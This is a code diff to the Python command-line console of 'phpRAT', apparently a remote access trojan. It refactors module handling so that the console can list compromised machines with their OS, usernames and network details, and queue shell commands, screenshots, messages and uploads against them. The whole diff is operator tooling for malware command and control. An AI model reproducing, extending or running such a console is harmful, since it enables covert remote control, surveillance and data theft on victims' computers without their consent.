@@ -10,17 +10,16 @@ import time
 from os import system, name
 from pyfiglet import Figlet
 import random
+from modules import *
 
 
 class CLI(cmd.Cmd):
 
     intro = 'Welcome to phpRAT, use ? to see the commands\n'
     prompt = '(phpRAT) '
-    machine_id = None
-    modules = ['msg', 'cmd', 'screenshot', 'upload']
-    message = None
-    command = None
-    path = None
+    modules = ['msg', 'shell', 'screenshot', 'upload']
+    module = None
+
 
     def get_curr_module(self):
         return re.search('\((.+?)\) ', self.prompt).group(1)
@@ -35,7 +34,7 @@ class CLI(cmd.Cmd):
         if len(args) == 0:
             print("Use help!")
             return
-        if 'machine' in args:
+        if 'machines' in args:
             print('Showing machines')
             lock.acquire(True)
             db.c.execute('SELECT * FROM machines')
@@ -50,18 +49,19 @@ class CLI(cmd.Cmd):
                 "MachineID", "LastConnected", "OS", "Computer Name", "Username", "Network Info", "CPU", "RAM"]))
             lock.release()
         elif 'queue' in args:
-            if self.machine_id:
-                print(f"Showing Queue of {self.machine_id}:")
-                print("===== Complete Tasks =====")
-                lock.acquire(True)
-                db.c.execute(
-                    'SELECT * FROM queue WHERE machineId=? AND isComplete="true"', (self.machine_id, ))
-                print(tabulate(db.c.fetchall()))
-                print("===== Pending Tasks =====")
-                db.c.execute(
-                    'SELECT * FROM queue WHERE machineId=? AND isComplete="false"', (self.machine_id, ))
-                print(tabulate(db.c.fetchall()))
-                lock.release()
+            if self.module:
+                if self.module.machine_id:
+                    print(f"Showing Queue of {self.module.machine_id}:")
+                    print("===== Complete Tasks =====")
+                    lock.acquire(True)
+                    db.c.execute(
+                        'SELECT * FROM queue WHERE machineId=? AND isComplete="true"', (self.module.machine_id, ))
+                    print(tabulate(db.c.fetchall()))
+                    print("===== Pending Tasks =====")
+                    db.c.execute(
+                        'SELECT * FROM queue WHERE machineId=? AND isComplete="false"', (self.module.machine_id, ))
+                    print(tabulate(db.c.fetchall()))
+                    lock.release()
             else:
                 print(f"Showing Queue:")
                 print("===== Complete Tasks =====")
@@ -75,25 +75,9 @@ class CLI(cmd.Cmd):
                 print(tabulate(db.c.fetchall()))
                 lock.release()
         elif 'options' in args:
-            curr_module = self.get_curr_module()
             print()
-            if curr_module == 'msg':
-                options = [('machine', str(self.machine_id), 'True'),
-                           ('message', str(self.message), 'True')]
-                print(tabulate(options, headers=[
-                      "Option", "Value", "Required"]), end='\n\n')
-            elif curr_module == 'cmd':
-                options = [('machine', str(self.machine_id), 'True'),
-                           ('command', str(self.command), 'True')]
-                print(tabulate(options, headers=[
-                      "Option", "Value", "Required"]), end='\n\n')
-            elif curr_module == 'screenshot':
-                options = [('machine', str(self.machine_id), 'True')]
-            elif curr_module == 'upload':
-                options = [('machine', str(self.machine_id), 'True'),
-                           ('path', str(self.path), 'True')]
-                print(tabulate(options, headers=[
-                      "Option", "Value", "Required"]), end='\n\n')
+            print(tabulate(self.module.options, headers=[
+                    "Option", "Value", "Required"]), end='\n\n')
         else:
             print("Use help!")
 
@@ -102,69 +86,40 @@ class CLI(cmd.Cmd):
         args = args.split(' ')
         if len(args) < 2:
             print("Use help!")
-        elif 'machine' in args[0]:
-            self.machine_id = ' '.join(args[1:])
-        elif 'message' in args[0]:
-            self.message = ' '.join(args[1:])
-        elif 'command' in args[0]:
-            self.command = ' '.join(args[1:])
-        elif 'path' in args[0]:
-            self.path = ' '.join(args[1:])
+        if self.module:
+            if hasattr(self.module, args[0]):
+                setattr(self.module, args[0], ' '.join(args[1:]))
+            else:
+                print("Use help!")
         else:
-            print("Use help!")
+                print("Use help!")
 
     def do_unset(self, args):
         '''Unset Value of Item'''
         if len(args) == 0:
             print("Use help!")
             return
-        if 'machine' in args:
-            self.machine_id = None
-            self.prompt = '(phpRAT) '
+        option = args.strip()
+        if option in dir(self.module):
+            setattr(self.module, option, None)
 
     def do_use(self, args):
         if len(args) == 0:
             print("Use help!")
             return
-        if 'msg' in args:
-            self.prompt = "(msg) "
-        if 'cmd' in args:
-            self.prompt = "(cmd) "
-        if 'screenshot' in args:
-            self.prompt = "(screenshot) "
-        if 'upload' in args:
-            self.prompt = "(upload) "
+        module = args.strip()
+        if module in self.modules:
+            self.prompt = f"({module}) "
+            self.module = globals()[module]()
 
     def do_execute(self, args):
-        curr_module = self.get_curr_module()
-        if curr_module == 'msg':
-            if self.machine_id and self.message:
-                task_id = queue.insert(
-                    'msg', self.machine_id, args=[self.message])
-                print(f"Added Task {task_id}")
-            else:
-                print("Check Options!")
-        elif curr_module == 'cmd':
-            if self.machine_id and self.command:
-                task_id = queue.insert(
-                    'cmd', self.machine_id, args=[self.command])
-                print(f"Added Task {task_id}")
-            else:
-                print("Check Options!")
-        elif curr_module == 'screenshot':
-            if self.machine_id:
-                task_id = queue.insert(
-                    'screenshot', self.machine_id, args=[])
-                print(f"Added Task {task_id}")
-            else:
-                print("Check Options!")
-        elif curr_module == 'upload':
-            if self.machine_id:
-                task_id = queue.insert(
-                    'upload', self.machine_id, args=[self.path])
-                print(f"Added Task {task_id}")
-            else:
-                print("Check Options!")
+        if all(option[1] for option in self.module.options if option[2]=='True'):
+            vals = [option[1] for option in self.module.options if option[0]!='machine_id']
+            task_id = queue.insert(
+                self.module.name, self.module.machine_id, args=vals)
+            print(f"Added Task {task_id}")
+        else:
+            print("Check Options!")
 
     def complete_show(self, text, line, begidx, endidx):
         args_len = 2
@@ -181,15 +136,8 @@ class CLI(cmd.Cmd):
 
     def complete_set(self, text, line, begidx, endidx):
         args_len = 3
-        if 'msg' in self.get_curr_module():
-            completions = ['machine', 'message']
-        elif 'cmd' in self.get_curr_module():
-            completions = ['machine', 'command']
-        elif 'screenshot' in self.get_curr_module():
-            completions = ['machine']
-        elif 'upload' in self.get_curr_module():
-            completions = ['machine', 'path']
-        if 'machine' in line:
+        completions = [option[0] for option in self.module.options]
+        if 'machine_id' in line:
             lock.acquire(True)
             db.c.execute('SELECT machineId FROM machines')
             completions = [i[0] for i in db.c.fetchall()]
@@ -202,7 +150,7 @@ class CLI(cmd.Cmd):
 
     def complete_unset(self, text, line, begidx, endidx):
         args_len = 2
-        completions = ['machine']
+        completions = [option[0] for option in self.module.options if option[1]]
         if len(line.split(' ')) > args_len:
             return []
         mline = line.split(' ')[-1]
